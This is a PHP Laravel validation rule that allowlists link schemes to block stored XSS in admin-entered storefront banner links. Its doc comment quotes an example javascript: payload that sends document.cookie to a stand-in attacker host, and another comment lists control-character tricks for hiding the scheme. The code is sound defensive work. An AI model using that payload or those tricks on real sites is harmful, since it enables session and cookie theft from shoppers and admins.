<?php

namespace App\Rules;

use Closure;
use Illuminate\Contracts\Validation\ValidationRule;

/**
 * Rejects link schemes that execute code instead of navigating.
 *
 * Slider, banner and community links are typed in the admin and rendered
 * straight into an href on the storefront, so a value like
 * "javascript:fetch('https://evil.example/'+document.cookie)" is stored XSS
 * against every shopper who clicks the banner - and against the next admin to
 * open the home page, whose session is worth far more.
 *
 * Only navigation schemes pass. A link with no scheme at all is fine: it is a
 * bare path or domain and the frontend adds https:// to it.
 */
class SafeLink implements ValidationRule
{
    private const ALLOWED = ['http', 'https', 'mailto', 'tel'];

    public function validate(string $attribute, mixed $value, Closure $fail): void
    {
        if (!is_string($value) || trim($value) === '') {
            return;
        }

        // Control characters are stripped first: "java\0script:" and
        // "java\tscript:" both survive an href and still execute.
        $link = preg_replace('/[\x00-\x20]/', '', $value);

        if (!preg_match('/^([a-z][a-z0-9+.\-]*):/i', $link, $matches)) {
            return;
        }

        if (!in_array(strtolower($matches[1]), self::ALLOWED, true)) {
            $fail('The :attribute must be a web address starting with http, https, mailto or tel.');
        }
    }
}
